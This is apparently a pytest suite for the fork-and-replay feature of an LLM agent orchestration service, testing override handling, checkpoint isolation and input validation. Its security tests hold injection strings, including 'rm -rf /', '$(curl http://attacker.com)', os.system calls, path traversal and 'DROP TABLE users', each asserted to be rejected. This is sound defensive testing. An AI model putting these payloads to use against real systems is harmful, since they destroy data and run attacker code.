"""Comprehensive tests for Phase 7 Milestone 5: Developer Execution Fork / Replay."""

import pytest
from fastapi.testclient import TestClient
from langgraph.checkpoint.memory import MemorySaver

from src.app.core.config import Settings
from src.app.llm.providers.mock import MockLLMProvider
from src.app.main import app
from src.app.models.schemas.llm import LLMResponse
from src.app.observability import trace_span
from src.app.replay.models import (
    MockToolResult,
    ModelOverride,
    ReplayModification,
    ReplayResult,
)
from src.app.replay.service import ReplayService
from src.app.services.orchestration_service import run_orchestrated_task
from src.app.tools.base import BaseTool, ToolResult
from src.app.tools.calculator import CalculatorTool
from src.app.tools.registry import ToolRegistry


class SpyTool(BaseTool):
    """Tool that tracks execution invocations for isolation and mocking assertions."""

    name = "spy_tool"
    description = "A spy tool tracking executions"

    def __init__(self):
        super().__init__()
        self.invocations = 0

    async def execute(self, **kwargs) -> ToolResult:
        self.invocations += 1
        return ToolResult(success=True, data={"invocations": self.invocations})


@pytest.fixture
def base_setup():
    """Fixture providing isolated checkpointer, mock LLM, and tool registry."""
    checkpointer = MemorySaver()
    spy = SpyTool()
    registry = ToolRegistry()
    registry.register(spy)
    registry.register(CalculatorTool())

    mock_llm = MockLLMProvider(
        responses=[
            LLMResponse(content='{"next_agent": "final"}', model="mock-llm"),
            LLMResponse(content="Final synthesized output for source run.", model="mock-llm"),
        ]
    )

    settings = Settings(
        app_env="testing",
        checkpoint_backend="memory",
        telemetry_enabled=True,
        telemetry_exporter="memory",
    )

    replay_service = ReplayService(
        settings=settings,
        checkpointer=checkpointer,
        tool_registry=registry,
    )

    return checkpointer, mock_llm, registry, settings, replay_service, spy


# ============================================================================
# 1. BASIC REPLAY & CHECKPOINT ISOLATION
# ============================================================================


@pytest.mark.asyncio
async def test_basic_replay_fork(base_setup):
    """Test creating an execution fork produces a new thread ID and preserves source state."""
    checkpointer, mock_llm, registry, settings, replay_service, _ = base_setup

    # 1. Run initial source execution
    source_thread = "thread_source_001"
    init_res = await run_orchestrated_task(
        task="Original source task",
        settings=settings,
        thread_id=source_thread,
        scope_id="project_alpha",
        provider=mock_llm,
        checkpointer=checkpointer,
        tool_registry=registry,
    )
    assert init_res.status == "completed"

    # Capture original checkpoint tuple
    src_tuple_before = await checkpointer.aget_tuple({"configurable": {"thread_id": source_thread}})
    assert src_tuple_before is not None

    # 2. Queue responses for replay fork
    mock_llm.queue_response(LLMResponse(content='{"next_agent": "final"}', model="mock-llm"))
    mock_llm.queue_response(LLMResponse(content="Replay fork answer.", model="mock-llm"))

    # 3. Execute replay
    replay_res = await replay_service.fork_and_replay(
        source_thread_id=source_thread,
        provider=mock_llm,
    )

    # 4. Verify new thread identity and results
    assert replay_res.success is True
    assert replay_res.source_thread_id == source_thread
    assert replay_res.replay_thread_id is not None
    assert replay_res.replay_thread_id != source_thread
    assert replay_res.answer == "Replay fork answer."
    assert replay_res.metadata.get("is_replay") is True
    assert replay_res.metadata.get("source_thread_id") == source_thread

    # 5. Verify source checkpoint is completely identical / unmutated
    src_tuple_after = await checkpointer.aget_tuple({"configurable": {"thread_id": source_thread}})
    assert src_tuple_after.checkpoint["id"] == src_tuple_before.checkpoint["id"]
    assert (
        src_tuple_after.checkpoint["channel_values"]["task"]
        == src_tuple_before.checkpoint["channel_values"]["task"]
    )


# ============================================================================
# 2. TASK OVERRIDE
# ============================================================================


@pytest.mark.asyncio
async def test_replay_task_override(base_setup):
    """Test replay with task override applies new task while preserving source task."""
    checkpointer, mock_llm, registry, settings, replay_service, _ = base_setup

    source_thread = "thread_task_test"
    await run_orchestrated_task(
        task="Analyze 2021 financial data",
        settings=settings,
        thread_id=source_thread,
        provider=mock_llm,
        checkpointer=checkpointer,
        tool_registry=registry,
    )

    mock_llm.queue_response(LLMResponse(content='{"next_agent": "final"}', model="mock-llm"))
    mock_llm.queue_response(LLMResponse(content="Answer for 2023 data.", model="mock-llm"))

    # Replay with task override
    mods = ReplayModification(task_override="Analyze 2023 financial data instead")
    replay_res = await replay_service.fork_and_replay(
        source_thread_id=source_thread,
        modifications=mods,
        provider=mock_llm,
    )

    assert replay_res.success is True
    assert (
        replay_res.applied_modifications.get("task_override")
        == "Analyze 2023 financial data instead"
    )

    # Verify source execution still has original task
    src_state = await checkpointer.aget_tuple({"configurable": {"thread_id": source_thread}})
    assert src_state.checkpoint["channel_values"]["task"] == "Analyze 2021 financial data"

    # Verify forked execution has overridden task
    fork_state = await checkpointer.aget_tuple(
        {"configurable": {"thread_id": replay_res.replay_thread_id}}
    )
    assert fork_state.checkpoint["channel_values"]["task"] == "Analyze 2023 financial data instead"


def test_replay_task_override_validation():
    """Verify empty or oversized task overrides are rejected."""
    with pytest.raises(ValueError, match="cannot be empty"):
        ReplayModification(task_override="   ")

    with pytest.raises(ValueError, match="exceeds maximum allowed length"):
        ReplayModification(task_override="A" * 5001)

    with pytest.raises(ValueError, match="illegal control characters"):
        ReplayModification(task_override="Illegal\x00task")


# ============================================================================
# 3. MODEL OVERRIDE
# ============================================================================


@pytest.mark.asyncio
async def test_replay_model_override_valid(base_setup):
    """Test model override with supported mock provider succeeds."""
    checkpointer, mock_llm, registry, settings, replay_service, _ = base_setup

    source_thread = "thread_model_test"
    await run_orchestrated_task(
        task="Test task",
        settings=settings,
        thread_id=source_thread,
        provider=mock_llm,
        checkpointer=checkpointer,
        tool_registry=registry,
    )

    mods = ReplayModification(
        model_override=ModelOverride(provider="mock", model="custom-mock-model")
    )
    replay_res = await replay_service.fork_and_replay(
        source_thread_id=source_thread,
        modifications=mods,
    )

    assert replay_res.success is True
    assert replay_res.applied_modifications["model_override"]["provider"] == "mock"


def test_replay_model_override_invalid():
    """Test model override rejects unsupported providers and illegal characters."""
    with pytest.raises(ValueError, match="Unsupported LLM provider"):
        ModelOverride(provider="malicious_provider", model="gpt-4")

    with pytest.raises(ValueError, match="invalid characters"):
        ModelOverride(provider="openai", model="model; rm -rf /")


# ============================================================================
# 4. SUPERVISOR ROUTE OVERRIDE
# ============================================================================


@pytest.mark.asyncio
async def test_replay_supervisor_route_override(base_setup):
    """Test initial supervisor routing directly to data agent when overridden."""
    checkpointer, mock_llm, registry, settings, replay_service, _ = base_setup

    source_thread = "thread_route_test"
    await run_orchestrated_task(
        task="Route test task",
        settings=settings,
        thread_id=source_thread,
        provider=mock_llm,
        checkpointer=checkpointer,
        tool_registry=registry,
    )

    # Queue data specialist response and final synthesis response
    mock_llm.queue_response(LLMResponse(content="Data calculation completed: 42", model="mock-llm"))
    mock_llm.queue_response(LLMResponse(content='{"next_agent": "final"}', model="mock-llm"))
    mock_llm.queue_response(
        LLMResponse(content="Final synthesis incorporating data 42.", model="mock-llm")
    )

    mods = ReplayModification(supervisor_route_override="data")
    replay_res = await replay_service.fork_and_replay(
        source_thread_id=source_thread,
        modifications=mods,
        provider=mock_llm,
    )

    assert replay_res.success is True
    assert "data" in replay_res.agents_used


def test_replay_supervisor_route_override_invalid():
    """Verify arbitrary node names or code strings are rejected by route override validator."""
    with pytest.raises(ValueError, match="Invalid supervisor route override"):
        ReplayModification(supervisor_route_override="eval")

    with pytest.raises(ValueError, match="Invalid supervisor route override"):
        ReplayModification(supervisor_route_override="__import__('os').system('calc')")


# ============================================================================
# 5. MOCK TOOL RESULTS
# ============================================================================


@pytest.mark.asyncio
async def test_replay_mock_tool_results(base_setup):
    """Test mock tool substitution intercepts execution and leaves underlying tool uninvoked."""
    checkpointer, mock_llm, registry, settings, replay_service, spy = base_setup

    source_thread = "thread_mock_tools"
    await run_orchestrated_task(
        task="Tool mock test",
        settings=settings,
        thread_id=source_thread,
        provider=mock_llm,
        checkpointer=checkpointer,
        tool_registry=registry,
    )
    assert spy.invocations == 0

    # Configure a mock result for spy_tool
    mock_result = MockToolResult(
        success=True,
        data={"mocked_key": "deterministic_mock_value"},
    )
    mods = ReplayModification(mock_tool_results={"spy_tool": mock_result})

    # Run tool execution directly through forked registry
    forked_reg = registry.fork(mock_tool_results=mods.mock_tool_results)
    tool_exec_res = await forked_reg.execute("spy_tool", {})

    assert tool_exec_res.success is True
    assert tool_exec_res.data == {"mocked_key": "deterministic_mock_value"}
    # The underlying tool's execute() was never invoked!
    assert spy.invocations == 0


def test_replay_mock_tool_results_validation():
    """Test validation boundaries reject invalid tool names or oversized payloads."""
    with pytest.raises(ValueError, match="Invalid tool name format"):
        ReplayModification(
            mock_tool_results={"invalid tool name with spaces!": MockToolResult(success=True)}
        )

    with pytest.raises(ValueError, match="exceeds maximum size limit"):
        MockToolResult(success=True, data={"big": "A" * 70_000})


# ============================================================================
# 6. SCOPE OVERRIDE & ISOLATION
# ============================================================================


@pytest.mark.asyncio
async def test_replay_scope_override_valid(base_setup):
    """Test scope_id override applies to the fork."""
    checkpointer, mock_llm, registry, settings, replay_service, _ = base_setup

    source_thread = "thread_scope_test"
    await run_orchestrated_task(
        task="Scope test task",
        settings=settings,
        thread_id=source_thread,
        scope_id="original_scope",
        provider=mock_llm,
        checkpointer=checkpointer,
        tool_registry=registry,
    )

    mock_llm.queue_response(LLMResponse(content='{"next_agent": "final"}', model="mock-llm"))
    mock_llm.queue_response(LLMResponse(content="Final answer in new scope.", model="mock-llm"))

    mods = ReplayModification(scope_id_override="new_team_scope")
    replay_res = await replay_service.fork_and_replay(
        source_thread_id=source_thread,
        modifications=mods,
        provider=mock_llm,
    )

    assert replay_res.success is True
    assert replay_res.metadata.get("scope_id") == "new_team_scope"


def test_replay_scope_override_invalid():
    """Verify unsafe scope override attempts are rejected."""
    with pytest.raises(ValueError, match="invalid characters"):
        ReplayModification(scope_id_override="../parent_scope/secret")

    with pytest.raises(ValueError, match="invalid characters"):
        ReplayModification(scope_id_override="scope; DROP TABLE users;")


# ============================================================================
# 7. MISSING SOURCE ERROR HANDLING
# ============================================================================


@pytest.mark.asyncio
async def test_replay_missing_source_thread(base_setup):
    """Test requesting replay on non-existent thread returns structured error."""
    *_, replay_service, _ = base_setup
    result = await replay_service.fork_and_replay(source_thread_id="non_existent_thread_xyz")
    assert result.success is False
    assert result.error_category == "source_not_found"
    assert "not found" in (result.error or "")


# ============================================================================
# 8. OBSERVABILITY & TELEMETRY
# ============================================================================


@pytest.mark.asyncio
async def test_replay_telemetry_bounded_attributes():
    """Verify replay span records low-cardinality flags without sensitive data."""
    from src.app.observability import init_telemetry

    init_telemetry(
        Settings(
            telemetry_enabled=True,
            telemetry_exporter="memory",
            telemetry_service_name="replay-test",
        )
    )
    async with trace_span(
        "replay.run",
        attributes={
            "execution_type": "replay",
            "has_task_override": True,
            "has_model_override": False,
        },
    ) as span:
        assert span.is_recording()

    # ReplayResult serialization should never contain high-cardinality metric dimensions
    res = ReplayResult(
        success=True,
        source_thread_id="src-1",
        replay_thread_id="fork-1",
        status="completed",
    )
    dump = res.model_dump()
    assert "prompt" not in dump
    assert "task_text" not in dump


# ============================================================================
# 9. SECURITY & CODE EXECUTION DEFENSE TEST
# ============================================================================


def test_security_rejection_of_executable_code():
    """Explicitly verify that code execution, callbacks, and injection are rejected."""
    # 1. Reject Python function calls in route
    with pytest.raises(ValueError):
        ReplayModification(supervisor_route_override="exec('print(1)')")

    # 2. Reject shell injection in model
    with pytest.raises(ValueError):
        ModelOverride(provider="openai", model="$(curl http://attacker.com)")

    # 3. Reject dynamic imports in provider
    with pytest.raises(ValueError):
        ModelOverride(provider="importlib.import_module('os')")

    # 4. Reject shell commands in scope
    with pytest.raises(ValueError):
        ReplayModification(scope_id_override="`whoami`")


# ============================================================================
# 10. FASTAPI HTTP /replay ENDPOINT TEST
# ============================================================================


def test_api_replay_endpoint():
    """Test POST /api/v1/orchestration/replay endpoint via TestClient."""
    with TestClient(app) as client:
        # 1. 404 on missing source thread
        resp = client.post(
            "/api/v1/orchestration/replay",
            json={"source_thread_id": "missing_thread_999"},
        )
        assert resp.status_code == 404
        assert "not found" in resp.json()["detail"].lower()

        # 2. 422 on invalid modification (e.g. invalid route)
        bad_resp = client.post(
            "/api/v1/orchestration/replay",
            json={
                "source_thread_id": "thread_1",
                "modifications": {"supervisor_route_override": "evil_node"},
            },
        )
        assert bad_resp.status_code == 422
